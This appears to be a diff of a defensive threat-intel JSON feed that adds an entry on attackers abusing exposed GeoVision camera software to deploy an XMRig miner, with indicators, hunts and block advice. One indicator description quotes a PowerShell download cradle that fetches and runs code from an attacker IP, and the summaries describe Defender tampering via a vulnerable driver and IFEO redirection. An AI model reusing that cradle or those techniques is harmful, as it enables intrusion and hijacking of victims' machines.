@@ -4,10 +4,10 @@
  "repository": "https://github.com/daniyyell-dev/rapid-threat-intel",
  "documentation": "https://github.com/daniyyell-dev/rapid-threat-intel/blob/main/docs/dashboard.md",
  "licence": "MIT",
- "last_updated": "2026-11-13 14:18",
- "threat_count": 51,
- "indicator_count": 1528,
- "block_now_count": 706,
+ "last_updated": "2026-11-13 15:02",
+ "threat_count": 52,
+ "indicator_count": 1540,
+ "block_now_count": 714,
  "combined_files": [
   {
    "name": "block_now.txt",
@@ -111,7 +111,7 @@
    "published": "2026-11-11",
    "entry_date": "2026-11-13 11:40",
    "last_updated": "2026-11-13",
-   "seq": 51,
+   "seq": 52,
    "headline": "Old Qlik Sense flaws exploited at EU firms for PowerShell reverse shells, a Go agent and SSH-key persistence",
    "summary": "Cynet reports that in October 2026 the Qlik Sense Scheduler.exe process on servers at several EU customers launched cmd.exe and a hidden, base64-encoded PowerShell reverse shell, all within about three minutes. The process tree matches the 2023 Cactus ransomware intrusions, so the operator most likely used the old Qlik Sense flaws CVE-2023-41266 with CVE-2023-41265, or CVE-2023-48365 (DoubleQlik). The shell is a trimmed Nishang one-liner that checks in to 45.115.26.23 over HTTP at /hb and connects back on TCP 4455. An open directory on the same server (TCP 8012) held a Go reverse-shell agent (wsvc.exe, TCP 4456) for Windows and several Linux architectures, a Bash agent (TCP 4457), a persist.ps1 script that installs OpenSSH, adds the ed25519 key node6-sm to administrators_authorized_keys, writes C:\\ProgramData\\ssh\\winc.ps1 and creates the WinUpdCheck task every five minutes, plus ActiveMQ CVE-2023-46604 payloads and a modified Veeam CVE-2024-40711 toolchain still in testing. The server address and the two persist.ps1 hashes are on the block list.",
    "caveat": "Cynet did not confirm which Qlik Sense vulnerability was used. The ActiveMQ and Veeam tooling looked unfinished and Cynet saw no successful exploitation with it. OpenSSH-Win64.zip on the staging server was the legitimate package, so it is not listed.",
@@ -462,7 +462,7 @@
    "published": "2026-11-09",
    "entry_date": "2026-11-13 11:40",
    "last_updated": "2026-11-13",
-   "seq": 50,
+   "seq": 51,
    "headline": "Stolen Qubole vendor credentials used to assume customer AWS integration roles, steal secrets and download S3 data",
    "summary": "Wiz, working with Sentra and Mandiant, reports that between 14 and 26 October 2026 a threat actor used IAM credentials from AWS account 805246085872, which Qubole's data platform uses to reach customer accounts, to assume the cross-account integration roles that dozens of customers had created to trust Qubole. Every AssumeRole call carried a valid External ID and succeeded, and most of the roles were otherwise unused. Using session names starting quiam-, the actor enumerated S3, EC2, RDS, IAM and KMS, read Lambda environment variables, Secrets Manager secrets and SSM parameters, downloaded whole S3 buckets, and validated the credentials it found with TruffleHog against AWS, Entra ID and Okta. Traffic came from an OVH server (57.129.54.120, which also hosted a bootable sso_agent.iso that beacons to TCP 23458) and Mullvad VPN exits. An actor calling itself n0n has claimed the intrusion. The OVH address and the ISO hashes are on the block list; the Mullvad exits, the vendor account and its principal IDs are alert-only hunt leads.",
    "caveat": "Account 805246085872 and the principal AIDAJYRRH5Y3A7AAJM2HW also carry legitimate Qubole traffic from AWS infrastructure; alert on them only when the source address is not an AWS address. AIDA3W7DIFLYOLTK63SFS was seen only in attacker activity. The Mullvad addresses are shared VPN exits and are not blocked. 57.129.54.120 was attacker-controlled from 15 to 26 October 2026 and may be reassigned later. The user agents Wiz lists are common and are only useful alongside another indicator.",
@@ -900,7 +900,7 @@
    "published": "2026-11-12",
    "entry_date": "2026-11-13 11:25",
    "last_updated": "2026-11-13",
-   "seq": 49,
+   "seq": 50,
    "headline": "A public exploit gives root on clustered Cisco Expressway nodes through hard-coded Erlang credentials on TCP 4372",
    "summary": "Cisco fixed CVE-2026-76466 (CVSS 9.8) on 21 October 2026: clustered Cisco Expressway-C and Expressway-E nodes, virtual and appliance, on X15.5.3 and earlier (and X14 and earlier) let an unauthenticated attacker run operating-system commands as root through the cluster database service. On 12 November researcher Nicolas Krassas (dinosn) published a working exploit and fleet detector on GitHub. It opens TLS to TCP 4372, completes the Erlang distribution handshake as the hard-coded maintenance node wombat@127.0.0.1 with the hard-coded cookie that is the same on every affected install, and calls os:cmd as root; it was tested on Expressway-C X15.3.2 in the factory-default TLS Permissive mode. Cisco says there is no workaround and, at the time of its advisory, knew of no malicious use; no exploitation has been reported since the code went public. No attacker infrastructure exists yet, so this entry is hunt and alert only. Its hunts flag connections to TCP 4371 or 4372 from anything that is not a cluster peer, and the public exploit being run from a managed host.",
    "caveat": "No exploitation or attacker indicators have been published; the CVE row is a tracking identifier, not something to block. The network hunt needs your Expressway cluster peer addresses filled in before it alerts, and it only sees traffic your firewall or NetFlow logs record. Expressway nodes do not run Defender for Endpoint, so the KQL can only see managed devices that connect out to the cluster ports or run the exploit.",
@@ -1097,6 +1097,489 @@
      "name": "hunt.yaral",
      "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/Cisco-Expressway-CVE-2026-76466-Public-Root-RCE-PoC/hunt.yaral",
      "download": "Cisco-Expressway-CVE-2026-76466-Public-Root-RCE-PoC_hunt.yaral"
+    }
+   ]
+  },
+  {
+   "id": "GeoVision-Camera-Software-XMRig-Cryptominer",
+   "folder": "threats/2026-11_November-2026/2026-11-13/GeoVision-Camera-Software-XMRig-Cryptominer",
+   "name": "GeoVision Camera Software Abused to Deploy XMRig Cryptominer",
+   "short": "GeoVision XMRig",
+   "category": "Exploitation / cryptomining",
+   "published": "2026-11-13",
+   "entry_date": "2026-11-13 15:02",
+   "last_updated": "2026-11-13",
+   "seq": 49,
+   "headline": "Exposed GeoVision camera software is being used to run PowerShell, a vulnerable driver and a Golang loader that drops XMRig",
+   "summary": "Huntress, writing on 13 November 2026, says its SOC saw widespread malicious activity from internet-exposed GeoVision camera software between 8 and 10 November, across ten accounts and 13 organisations in various industries. Every case started with GeoStartupAgentService.exe, often running as SYSTEM, spawning a command shell that downloaded PowerShell scripts a, b and c from 45.32.117.34 (Vultr, Singapore). Those scripts checked for Defender, dropped a vulnerable signed driver (wsftprm.sys, written as kvckiller.sys) used to tamper with antivirus, and set IFEO Debugger values that redirect MsMpEng.exe, SecurityHealthService.exe and SecurityHealthSystray.exe to systray.exe. A further script fetched update.exe, a Golang loader that talks to 156.246.94.183 (AkileCloud, Tokyo; cctv-update.top, registered 7 November) using BitTorrent Mainline DHT and PKARR, creates scheduled tasks PackageUpdater (every 15 minutes) and PackageUpdater_Startup, and drops XMRig as ApplyUpdate.exe. The staging IP, loader IP, domain, PowerShell URLs and the published update.exe and PowerShell script hashes are on the block list, as hosts only. 2.59.133.151, which Huntress called the likely exploit source, is alert only because it sits on shared or reused dataforest hosting. The wsftprm.sys hash is alert only: it is a known signed Topaz Antifraud driver (CVE-2023-52271) still used by some banking software.",
+   "caveat": "Do not block 2.59.133.151 (dataforest shared or reused hosting) or thisismy.cloud. Do not block the SHA256 of wsftprm.sys estate-wide without checking for legitimate Topaz Antifraud (Warsaw) software. Do not block BitTorrent DHT bootstrap nodes, PKARR relays, public DNS resolvers or shared mining pools. Block 45.32.117.34, 156.246.94.183 and cctv-update.top as listed hosts only, not the surrounding ranges or parent domains.",
+   "targets": {
+    "countries": [],
+    "regions": [],
+    "sectors": [
+     "Organizations with internet-exposed GeoVision camera software or management interfaces"
+    ],
+    "note": "Huntress saw the activity on ten accounts and 13 organisations across various industries between 8 and 10 November 2026. No countries were named. All cases started from publicly exposed GeoVision devices or management interfaces.",
+    "source": {
+     "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "name": "Huntress"
+    }
+   },
+   "mitre": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "url": "https://attack.mitre.org/techniques/T1190/"
+    },
+    {
+     "id": "T1059.003",
+     "name": "Command and Scripting Interpreter: Windows Command Shell",
+     "url": "https://attack.mitre.org/techniques/T1059/003/"
+    },
+    {
+     "id": "T1059.001",
+     "name": "Command and Scripting Interpreter: PowerShell",
+     "url": "https://attack.mitre.org/techniques/T1059/001/"
+    },
+    {
+     "id": "T1053.005",
+     "name": "Scheduled Task/Job: Scheduled Task",
+     "url": "https://attack.mitre.org/techniques/T1053/005/"
+    },
+    {
+     "id": "T1546.012",
+     "name": "Event Triggered Execution: Image File Execution Options Injection",
+     "url": "https://attack.mitre.org/techniques/T1546/012/"
+    },
+    {
+     "id": "T1112",
+     "name": "Modify Registry",
+     "url": "https://attack.mitre.org/techniques/T1112/"
+    },
+    {
+     "id": "T1562.001",
+     "name": "Impair Defenses: Disable or Modify Tools",
+     "url": "https://attack.mitre.org/techniques/T1562/001/"
+    },
+    {
+     "id": "T1068",
+     "name": "Exploitation for Privilege Escalation",
+     "url": "https://attack.mitre.org/techniques/T1068/"
+    },
+    {
+     "id": "T1105",
+     "name": "Ingress Tool Transfer",
+     "url": "https://attack.mitre.org/techniques/T1105/"
+    },
+    {
+     "id": "T1568",
+     "name": "Dynamic Resolution",
+     "url": "https://attack.mitre.org/techniques/T1568/"
+    },
+    {
+     "id": "T1496.001",
+     "name": "Resource Hijacking: Compute Hijacking",
+     "url": "https://attack.mitre.org/techniques/T1496/001/"
+    },
+    {
+     "id": "T1608.001",
+     "name": "Stage Capabilities: Upload Malware",
+     "url": "https://attack.mitre.org/techniques/T1608/001/"
+    }
+   ],
+   "recommended_actions": [
+    "Block 45.32.117.34, 156.246.94.183, cctv-update.top, the PowerShell staging URLs and the published update.exe and PowerShell script hashes, and search 90 days of proxy, DNS, firewall and EDR logs for them. Block those hosts only, not the surrounding ranges.",
+    "Take internet-facing GeoVision camera software and management interfaces off the public internet; put them behind a VPN or restrict them to trusted addresses.",
+    "Hunt GeoStartupAgentService.exe spawning cmd or PowerShell, IFEO Debugger values on MsMpEng.exe, SecurityHealthService.exe, SecurityHealthSystray.exe or MpCmdRun.exe, the scheduled tasks PackageUpdater and PackageUpdater_Startup, wsftprm.sys or kvckiller.sys loading from an unexpected path, and ApplyUpdate.exe with XMRig arguments.",
+    "On a confirmed host, isolate it, preserve evidence, remove the tasks and dropped files, clear the IFEO Debugger values, and investigate whether Defender was tampered with before returning the host to service.",
+    "Do not block 2.59.133.151, thisismy.cloud, public DNS resolvers, BitTorrent DHT bootstrap nodes, PKARR relays or shared mining pools, and do not block the wsftprm.sys hash estate-wide without checking for legitimate Topaz Antifraud software."
+   ],
+   "sources": [
+    {
+     "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "name": "Huntress"
+    },
+    {
+     "url": "https://urlhaus.abuse.ch/host/2.59.133.151/",
+     "label": "URLhaus – 2.59.133.151 (prior unrelated malware-download listing)",
+     "name": "URLhaus"
+    },
+    {
+     "url": "https://www.loldrivers.io/drivers/30e8d598-2c60-49e4-953b-a6f620da1371/",
+     "label": "LOLDrivers – wsftprm.sys (Topaz Antifraud, CVE-2023-52271)",
+     "name": "loldrivers.io"
+    }
+   ],
+   "indicator_count": 12,
+   "block_now_count": 8,
+   "hunt_count": 4,
+   "hunt_counts": {
+    "alert": 4
+   },
+   "indicator_counts": {
+    "ipv4": 3,
+    "sha256": 3,
+    "url": 3,
+    "filename": 2,
+    "domain": 1
+   },
+   "ioas": [
+    {
+     "artefact": "GeoStartupAgentService.exe spawning cmd.exe, PowerShell or pwsh.exe",
+     "log_source": "Defender XDR DeviceProcessEvents; EDR process events",
+     "why": "Every intrusion Huntress saw started here: the exposed GeoVision service, often running as SYSTEM, spawned a command shell that launched PowerShell to download script a from 45.32.117.34. GeoStartupAgentService.exe has no ordinary reason to start cmd or PowerShell. Expected false positives are rare; a GeoVision support or update procedure that shells out would be the main one, and should still be reviewed.",
+     "action": "alert",
+     "has_query": true,
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_name": "Huntress",
+     "title": "GeoStartupAgentService.exe spawning a shell or PowerShell",
+     "queries": [
+      "KQL",
+      "SPL",
+      "YARA-L"
+     ]
+    },
+    {
+     "artefact": "A driver load or file named wsftprm.sys or kvckiller.sys",
+     "log_source": "Defender XDR DeviceEvents (DriverLoad) and DeviceFileEvents; EDR driver and file events",
+     "why": "Script b dropped kvckiller.sys, which VirusTotal identifies as the signed Topaz Antifraud driver wsftprm.sys, and used it as a BYOVD tool against Defender. The published hash is a known legitimate, if vulnerable, driver (CVE-2023-52271) still used by some banking antifraud deployments, so a load from a normal Topaz or Warsaw install path can be a false positive. Treat a load or write from a temp, user or unexpected path, or the filename kvckiller.sys, as a high-priority lead.",
+     "action": "alert",
+     "has_query": true,
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_name": "Huntress",
+     "title": "wsftprm.sys or kvckiller.sys driver load or file",
+     "queries": [
+      "KQL",
+      "SPL",
+      "YARA-L"
+     ]
+    },
+    {
+     "artefact": "IFEO Debugger values set on MsMpEng.exe, SecurityHealthService.exe, SecurityHealthSystray.exe or MpCmdRun.exe",
+     "log_source": "Defender XDR DeviceRegistryEvents; Windows Registry auditing",
+     "why": "The operators wrote Image File Execution Options Debugger values that redirected MsMpEng.exe, SecurityHealthService.exe and SecurityHealthSystray.exe to systray.exe, which can stop those Defender and Windows Security components starting. MpCmdRun.exe is included as the related Defender command-line process. A Debugger value under those keys, or an IFEO Debugger set to systray.exe, is not a normal administrative setting. Expected false positives are very rare; a legitimate debugger attached to those binaries should already be known to the estate.",
+     "action": "alert",
+     "has_query": true,
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_name": "Huntress",
+     "title": "IFEO Debugger set on Microsoft Defender or Windows Security processes",
+     "queries": [
+      "KQL",
+      "SPL",
+      "YARA-L"
+     ]
+    },
+    {
+     "artefact": "Scheduled task PackageUpdater or PackageUpdater_Startup running update.exe, or update.exe launched from the systemprofile folder",
+     "log_source": "Defender XDR DeviceEvents (ScheduledTaskCreated) and DeviceProcessEvents; Windows Security 4698; Task Scheduler operational log",
+     "why": "On some hosts the loader created PackageUpdater, which runs C:\\WINDOWS\\system32\\config\\systemprofile\\update.exe every 15 minutes, and PackageUpdater_Startup, which runs at system start as SYSTEM. The task names plus that systemprofile path are distinctive. update.exe in other folders is a common legitimate name and is not enough on its own.",
+     "action": "alert",
+     "has_query": true,
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_name": "Huntress",
+     "title": "PackageUpdater task or update.exe from the systemprofile folder",
+     "queries": [
+      "KQL",
+      "SPL",
+      "YARA-L"
+     ]
+    },
+    {
+     "artefact": "ApplyUpdate.exe launched with XMRig arguments",
+     "log_source": "Defender XDR DeviceProcessEvents; EDR process events",
+     "why": "The loader dropped the XMRig miner as ApplyUpdate.exe. The filename alone can appear in legitimate updaters, so this hunt requires XMRig-style arguments such as --url, --user, --donate-level, --coin, --algo or a stratum+ address. Expected false positives are very rare.",
+     "action": "alert",
+     "has_query": true,
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_name": "Huntress",
+     "title": "ApplyUpdate.exe launched with XMRig arguments",
+     "queries": [
+      "KQL",
+      "SPL",
+      "YARA-L"
+     ]
+    }
+   ],
+   "ioa_count": 5,
+   "ioa_note": "Behaviours are leads, not confirmed indicators, and can match legitimate activity. Compare any hit against your own baseline and environment before acting.",
+   "files": [
+    {
+     "name": "block_now.txt",
+     "label": "Block list",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/GeoVision-Camera-Software-XMRig-Cryptominer/block_now.txt",
+     "download": "GeoVision-Camera-Software-XMRig-Cryptominer_block_now.txt"
+    },
+    {
+     "name": "defender_xdr_indicators.csv",
+     "label": "Defender XDR import",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/GeoVision-Camera-Software-XMRig-Cryptominer/defender_xdr_indicators.csv",
+     "download": "GeoVision-Camera-Software-XMRig-Cryptominer_defender_xdr_indicators.csv"
+    },
+    {
+     "name": "hunt.kql",
+     "label": "Hunting query (KQL)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/GeoVision-Camera-Software-XMRig-Cryptominer/hunt.kql",
+     "download": "GeoVision-Camera-Software-XMRig-Cryptominer_hunt.kql"
+    },
+    {
+     "name": "hunt.spl",
+     "label": "Hunting query (SPL)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/GeoVision-Camera-Software-XMRig-Cryptominer/hunt.spl",
+     "download": "GeoVision-Camera-Software-XMRig-Cryptominer_hunt.spl"
+    },
+    {
+     "name": "hunt_raw.spl",
+     "label": "Hunting query (SPL, raw events)",
+     "note": "hunt_raw.spl, for data not mapped to CIM",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/GeoVision-Camera-Software-XMRig-Cryptominer/hunt_raw.spl",
+     "download": "GeoVision-Camera-Software-XMRig-Cryptominer_hunt_raw.spl"
+    },
+    {
+     "name": "hunt.yaral",
+     "label": "Hunting query (YARA-L 2.0)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/GeoVision-Camera-Software-XMRig-Cryptominer/hunt.yaral",
+     "download": "GeoVision-Camera-Software-XMRig-Cryptominer_hunt.yaral"
+    },
+    {
+     "name": "iocs.csv",
+     "label": "All indicators (CSV)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/GeoVision-Camera-Software-XMRig-Cryptominer/iocs.csv",
+     "download": "GeoVision-Camera-Software-XMRig-Cryptominer_iocs.csv"
+    }
+   ],
+   "repo_url": "https://github.com/daniyyell-dev/rapid-threat-intel/tree/main/threats/2026-11_November-2026/2026-11-13/GeoVision-Camera-Software-XMRig-Cryptominer",
+   "share_url": "https://daniyyell.com/rapid-threat-intel/t/GeoVision-Camera-Software-XMRig-Cryptominer/",
+   "indicators": [
+    {
+     "value": "45.32.117.34",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PowerShell staging server that hosted scripts a, b and c, first launched as iex (New-Object Net.WebClient).DownloadString after GeoStartupAgentService.exe spawned a command shell. Huntress, 13 November 2026. Vultr / The Constant Company AS20473, Singapore. Block this host only, not the range.",
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "source_name": "Huntress",
+     "sources": [
+      {
+       "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+       "name": "Huntress"
+      }
+     ]
+    },
+    {
+     "value": "http://45.32.117.34/a",
+     "type": "url",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PowerShell download cradle used in the initial command: powershell -c iex (New-Object Net.WebClient).DownloadString('http://45.32.117.34/a'). Huntress, 13 November 2026.",
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "source_name": "Huntress",
+     "sources": [
+      {
+       "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+       "name": "Huntress"
+      }
+     ]
+    },
+    {
+     "value": "http://45.32.117.34/b",
+     "type": "url",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Secondary PowerShell script written to disk and launched with WMI; it repeated the writable-folder probe and downloaded kvckiller.sys (wsftprm.sys). Huntress, 13 November 2026.",
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "source_name": "Huntress",
+     "sources": [
+      {
+       "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+       "name": "Huntress"
+      }
+     ]
+    },
+    {
+     "value": "http://45.32.117.34/c",
+     "type": "url",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PowerShell script detonated in memory to download and run the Golang loader update.exe in the current directory. Huntress, 13 November 2026.",
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "source_name": "Huntress",
+     "sources": [
+      {
+       "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+       "name": "Huntress"
+      }
+     ]
+    },
+    {
+     "value": "156.246.94.183",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Address the custom Golang loader update.exe reached. Huntress, 13 November 2026. AkileCloud Network / AKILE LTD AS61112, Tokyo. Resolved to cctv-update.top. Block this host only, not the range.",
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "source_name": "Huntress",
+     "sources": [
+      {
+       "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+       "name": "Huntress"
+      }
+     ]
+    },
+    {
+     "value": "cctv-update.top",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Domain that resolved to 156.246.94.183 at the time of the investigation. Huntress says it was registered on 7 November 2026 at 02:40 UTC. Block this exact domain.",
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "source_name": "Huntress",
+     "sources": [
+      {
+       "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+       "name": "Huntress"
+      }
+     ]
+    },
+    {
+     "value": "f1235751c9e48e5732b7b183dc2bb175a19e4c6401dfd0e96b4cfdd0d8c54b4c",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "SHA256 of update.exe, the custom Golang loader that uses a BitTorrent Mainline DHT client and a PKARR resolver to find moving infrastructure, creates the PackageUpdater tasks, and drops XMRig as ApplyUpdate.exe. Huntress, 13 November 2026.",
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "source_name": "Huntress",
+     "sources": [
+      {
+       "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+       "name": "Huntress"
+      }
+     ]
+    },
+    {
+     "value": "b673c4d707828abedc767a2be6badef7454492e62c37e30cf3cc5a402fd3647b",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "SHA256 Huntress published for the PowerShell scripts a, b and c used in the attack chain after GeoStartupAgentService.exe spawned a shell. Huntress, 13 November 2026.",
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "source_name": "Huntress",
+     "sources": [
+      {
+       "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+       "name": "Huntress"
+      }
+     ]
+    },
+    {
+     "value": "ff5dbdcf6d7ae5d97b6f3ef412df0b977ba4a844c45b30ca78c0eeb2653d69a8",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "alert",
+     "description": "SHA256 of wsftprm.sys, dropped as kvckiller.sys. This is the signed Topaz Antifraud (Warsaw) kernel driver v2.0.0.0 (CVE-2023-52271) abused as a BYOVD tool to terminate protected processes such as Microsoft Defender. Alert only: the same hash is a known legitimate, if vulnerable, driver still used by some banking antifraud deployments. Do not block estate-wide without checking for Topaz software. Huntress, 13 November 2026; also catalogued on LOLDrivers.",
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "source_name": "Huntress",
+     "sources": [
+      {
+       "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+       "name": "Huntress"
+      },
+      {
+       "url": "https://www.loldrivers.io/drivers/30e8d598-2c60-49e4-953b-a6f620da1371/",
+       "name": "loldrivers.io"
+      }
+     ]
+    },
+    {
+     "value": "2.59.133.151",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "alert",
+     "description": "WebCamServer.exe was seen reaching this address; Huntress calls it the likely source of exploitation. dataforest GmbH AS58212, Frankfurt, PTR app.thisismy.cloud. The host exposes many services and has an older, unrelated URLhaus malware-download listing (XXE, December 2025), so treat it as shared or reused hosting: alert only, do not block, and do not block thisismy.cloud.",
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "source_name": "Huntress",
+     "sources": [
+      {
+       "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+       "name": "Huntress"
+      },
+      {
+       "url": "https://urlhaus.abuse.ch/host/2.59.133.151/",
+       "name": "URLhaus"
+      }
+     ]
+    },
+    {
+     "value": "kvckiller.sys",
+     "type": "filename",
+     "confidence": "high",
+     "recommended_action": "alert",
+     "description": "Filename used for the dropped wsftprm.sys BYOVD driver. Alert only; confirm the file and path before acting.",
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "source_name": "Huntress",
+     "sources": [
+      {
+       "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+       "name": "Huntress"
+      }
+     ]
+    },
+    {
+     "value": "ApplyUpdate.exe",
+     "type": "filename",
+     "confidence": "high",
+     "recommended_action": "alert",
+     "description": "Filename used for the dropped XMRig miner. Alert only: the name is not unique enough to block; hunt it with XMRig arguments.",
+     "source_url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+     "source_label": "Huntress – GeoVision Camera Software Exploited to Drop XMRig",
+     "source_name": "Huntress",
+     "sources": [
+      {
+       "url": "https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer",
+       "name": "Huntress"
+      }
+     ]
+    }
+   ],
+   "queries": [
+    {
+     "platform": "Defender XDR",
+     "language": "KQL",
+     "name": "hunt.kql",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/GeoVision-Camera-Software-XMRig-Cryptominer/hunt.kql",
+     "download": "GeoVision-Camera-Software-XMRig-Cryptominer_hunt.kql"
+    },
+    {
+     "platform": "Splunk",
+     "language": "SPL",
+     "name": "hunt.spl",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/GeoVision-Camera-Software-XMRig-Cryptominer/hunt.spl",
+     "download": "GeoVision-Camera-Software-XMRig-Cryptominer_hunt.spl",
+     "alt": {
+      "label": "No CIM? Raw-search version",
+      "name": "hunt_raw.spl",
+      "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/GeoVision-Camera-Software-XMRig-Cryptominer/hunt_raw.spl",
+      "download": "GeoVision-Camera-Software-XMRig-Cryptominer_hunt_raw.spl"
+     }
+    },
+    {
+     "platform": "Google SecOps",
+     "language": "YARA-L 2.0",
+     "name": "hunt.yaral",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/GeoVision-Camera-Software-XMRig-Cryptominer/hunt.yaral",
+     "download": "GeoVision-Camera-Software-XMRig-Cryptominer_hunt.yaral"
     }
    ]
   },
